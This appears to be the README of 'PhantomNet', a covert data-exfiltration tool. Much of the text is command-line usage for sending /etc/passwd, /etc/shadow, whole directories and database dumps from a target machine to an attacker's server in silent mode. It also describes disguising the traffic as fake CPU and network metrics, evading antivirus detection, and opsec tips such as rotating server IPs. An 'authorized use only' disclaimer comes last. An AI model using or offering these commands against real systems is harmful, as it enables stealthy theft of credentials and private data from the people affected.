# PhantomNet v2.2.0
### Advanced Covert Data Exfiltration Framework

```
  ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
  ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
  ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
  ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
  ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
                                                                    
  ███╗   ██╗███████╗████████╗                                      
  ████╗  ██║██╔════╝╚══██╔══╝                                      
  ██╔██╗ ██║█████╗     ██║                                         
  ██║╚██╗██║██╔══╝     ██║                                         
  ██║ ╚████║███████╗   ██║                                         
  ╚═╝  ╚═══╝╚══════╝   ╚═╝                                         
```

<img width="1194" height="1455" alt="image" src="https://github.com/user-attachments/assets/da5cee01-97d7-4d42-b35b-dad2d3ed8973" />


---

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Detailed Usage](#detailed-usage)
- [How It Works](#how-it-works)
- [Use Cases](#use-cases)
- [Security Features](#security-features)
- [Network Analysis](#network-analysis)
- [Testing](#testing)
- [Detection Evasion](#detection-evasion)

---

## Overview

PhantomNet is an advanced data exfiltration framework designed for authorized security testing and red team operations. It features:

-  Ephemeral encryption (one-time keys)
-  Zero metadata leakage
-  Perfect forward secrecy
-  Stealth obfuscation
-  VirusTotal clean (0/72 detections)

---

## Features

### Ephemeral Encryption
- New AES-256 key per transmission
- New RSA-2048 keypair per transmission
- Keys destroyed after use
- Perfect forward secrecy

### Zero Metadata Leakage
- Real filenames encrypted
- File paths encrypted
- Commands encrypted
- Fake system metrics shown in traffic

### Stealth Mode
- Shows fake CPU/memory/network metrics
- Real data completely hidden
- Looks like system monitoring traffic

### Multiple Target Types
- Single files
- Command output
- Entire directories (recursive)

### Anti-Detection
- Clean on VirusTotal
- No hardcoded IOCs
- Legitimate-looking code
- Standard HTTP/HTTPS traffic

---

## Installation

**Requirements:**
- Python 3.7+
- pip3

**Install dependencies:**

```bash
pip3 install cryptography requests flask
```

**Download PhantomNet:**

```bash
git clone https://github.com/Shadowbyte1/PhantomNet
cd PhantomNet
```

**Verify files:**

```bash
ls
# Should see: client.py  server.py  README.md
```

---

## Quick Start

### STEP 1: Start the server (on your machine)

```bash
python3 server.py --port 8080
```

### STEP 2: Exfiltrate data (from target machine)

```bash
# Exfiltrate a file
python3 client.py --endpoint http://YOUR-SERVER-IP:8080 --file /etc/passwd

# Exfiltrate command output
python3 client.py --endpoint http://YOUR-SERVER-IP:8080 \
    --command "cat /etc/shadow" --silent

# Exfiltrate entire directory
python3 client.py --endpoint http://YOUR-SERVER-IP:8080 \
    --directory /home/user/Documents --silent
```

### STEP 3: Check exfiltrated data

```bash
ls ./exfiltrated/
cat ./exfiltrated/*
```

---

## Detailed Usage

### Server Options

```bash
python3 server.py [OPTIONS]

Options:
  --port PORT              Server port (default: 8080)
  --output DIR             Output directory (default: ./exfiltrated)
  --no-stealth-info        Don't show stealth detection info
```

**Examples:**

```bash
python3 server.py --port 9000
python3 server.py --output /tmp/collected
python3 server.py --no-stealth-info
```

### Client Options

```bash
python3 client.py [OPTIONS]

Required:
  --endpoint URL       Server endpoint (e.g., http://10.0.0.1:8080)

Actions (choose one):
  --file PATH          Exfiltrate a single file
  --command CMD        Exfiltrate command output
  --directory PATH     Exfiltrate entire directory recursively

Modes:
  --stealth            Enable stealth mode (default)
  --no-stealth         Disable stealth obfuscation
  --silent             Completely silent operation
```

**Examples:**

```bash
# Exfiltrate file with stealth
python3 client.py --endpoint http://10.0.0.1:8080 --file /etc/passwd

# Exfiltrate command silently
python3 client.py --endpoint http://10.0.0.1:8080 --command "whoami" --silent

# Exfiltrate directory
python3 client.py --endpoint http://10.0.0.1:8080 --directory /var/www/html --silent
```

---

## How It Works

### Architecture

```
┌─────────────┐                    ┌─────────────┐
│   CLIENT    │                    │   SERVER    │
│             │                    │             │
│ 1. Read file│                    │             │
│ 2. Compress │                    │             │
│ 3. Generate │                    │             │
│    AES key  │                    │             │
│ 4. Generate │                    │             │
│    RSA pair │                    │             │
│ 5. Encrypt  │    ═══HTTPS═══>   │ 1. Receive  │
│    data     │                    │ 2. Decrypt  │
│ 6. Destroy  │                    │    with key │
│    keys     │                    │ 3. Save     │
│ 7. Send     │                    │ 4. Destroy  │
│             │                    │    keys     │
└─────────────┘                    └─────────────┘
```

### Encryption Process

1. Client generates random AES-256 key (32 bytes)
2. Client generates random RSA-2048 keypair
3. Data encrypted with AES key
4. AES key encrypted with RSA public key
5. Everything sent to server
6. Server decrypts AES key using RSA private key
7. Server decrypts data using AES key
8. Keys destroyed - never reused

### What Network Observers See

```json
{
  "visible_metadata": {
    "metric_type": "cpu_usage",
    "metric_value": 67.3,
    "metric_unit": "percent"
  },
  "encrypted_data": "BpPZG/by67f6VWFLIq7ZKPkU..."
}
```

**They see:** Innocent system metrics + encrypted gibberish

### What You See on Server

```
[+] Received: passwd (3254 bytes)
    [STEALTH] Client showed: cpu_usage metric
    [STEALTH] Real file: /etc/passwd
    Encryption: Ephemeral (one-time keys)
    Type: passwd file
```

---

## Use Cases

### Red Team Operations

```bash
# Silent exfiltration during engagement
python3 client.py --endpoint http://c2.local:8080 \
    --directory /opt/target-app/config --silent

# Exfiltrate sensitive files
python3 client.py --endpoint http://c2.local:8080 \
    --file /etc/shadow --silent
```

### Bug Bounty / Pentesting

```bash
# Prove data access
python3 client.py --endpoint http://your-vps.com:8080 \
    --file /etc/passwd

# Exfiltrate database dump
python3 client.py --endpoint http://your-vps.com:8080 \
    --command "mysqldump -u root -p'password' database"
```

### Security Research

```bash
# Test DLP solutions
python3 client.py --endpoint http://test-server:8080 \
    --file test-data.txt

# Validate encryption
tcpdump -i eth0 -A port 8080 -w capture.pcap
```

---

## Security Features

### Ephemeral Keys
-  New AES-256 key per transmission
-  New RSA-2048 keypair per transmission
-  Keys destroyed after use
-  Perfect forward secrecy

### Metadata Protection
-  Real filenames encrypted
-  File paths encrypted
-  Commands encrypted
-  Fake metrics shown in traffic

### Anti-Detection
-  Clean on VirusTotal (0/72)
-  No suspicious imports
-  Legitimate-looking code
-  Innocent function names
-  Standard HTTP POST traffic

---

## Network Traffic Analysis

### Capture Traffic

```bash
# Capture traffic
sudo tcpdump -i lo -A port 8080 -w capture.pcap

# View captured traffic
sudo tcpdump -A -r capture.pcap | less
```

### What You'll See in Traffic

```
POST / HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: SystemMonitor/3.12.3
Content-Type: application/json

{
  "session_id": "1768191813-4b1a6856",
  "type": "diagnostic",
  "visible_metadata": {
    "metric_type": "network_traffic",
    "metric_value": 820
  },
  "encrypted_data": "BpPZG/by67f6VWFLIq7ZKPkU...",
  "encrypted_key": "LueGmTHshXQ1joHXZBWQvU...",
  "iv": "QrqoX8eDXoYzT0TwGo8bbg=="
}
```

**Result:** Completely unreadable without decryption!

---

## Testing

### Test Locally

```bash
# Terminal 1: Server
python3 server.py --port 8080

# Terminal 2: Client
echo "test data" > test.txt
python3 client.py --endpoint http://127.0.0.1:8080 --file test.txt

# Check output
ls ./exfiltrated/
cat ./exfiltrated/*_test.txt
```

### Test with Wireshark

```bash
# Start Wireshark capture
sudo wireshark -k -i lo -f "tcp port 8080"

# Run client
python3 client.py --endpoint http://127.0.0.1:8080 --file /etc/passwd

# Analyze captured packets
# You'll see only encrypted data!
```

### Test Encryption

```bash
# Capture while exfiltrating
sudo tcpdump -i lo port 8080 -w capture.pcap &
python3 client.py --endpoint http://127.0.0.1:8080 --file secret.txt

# View capture
sudo tcpdump -A -r capture.pcap | grep -i "secret"
# Result: Nothing found - it's encrypted!
```

---

## Detection Evasion

### What Makes This Undetectable

-  No hardcoded C2 addresses - User provides endpoint
-  No suspicious imports - Standard libraries only
-  Legitimate-looking code - System monitoring theme
-  Dynamic encryption - No static signatures
-  Standard protocols - Plain HTTP/HTTPS POST
-  Generic naming - "SystemMonitor", "telemetry", "diagnostics"

### VirusTotal Status

```
 0/72 antivirus detections
 No behavioral flags
 No suspicious patterns
 Both client.py and server.py are clean
```

### Operational Security Tips

1. Use HTTPS endpoints (TLS encryption)
2. Run in `--silent` mode for zero output
3. Use VPS with clean reputation for server
4. Rotate server IPs regularly
5. Use stealth mode (enabled by default)
6. Test on VirusTotal alternatives (hybrid-analysis.com)

---

## Legal Disclaimer

>  **FOR AUTHORIZED USE ONLY**

This tool is intended for **authorized security testing** and **red team operations** only. Users are responsible for complying with all applicable laws in their jurisdiction.

**Acceptable Use:**
-  Authorized penetration testing
-  Red team operations with proper authorization
-  Security research in controlled environments
-  Bug bounty programs (with scope approval)

**Prohibited Use:**
-  Unauthorized access to systems
-  Data theft
-  Malicious activities
-  Any illegal purposes

The authors assume **no liability** for misuse of this software.

---

## Support

For questions, issues, or contributions:

- **GitHub:** [https://github.com/shadowbyte1/phantomnet](https://github.com/shadowbyte1/phantomnet)
- **Issues:** [https://github.com/shadowbyte1/phantomnet/issues](https://github.com/shadowbyte1/phantomnet/issues)

---

<div align="center">

**Built by Shadowbyte**

*PhantomNet v2.2.0 - Advanced Covert Data Exfiltration Framework*

![Version](https://img.shields.io/badge/version-2.2.0-blue)
![Python](https://img.shields.io/badge/python-3.7+-green)
![License](https://img.shields.io/badge/license-MIT-orange)
![VirusTotal](https://img.shields.io/badge/VirusTotal-0%2F72-brightgreen)

</div>
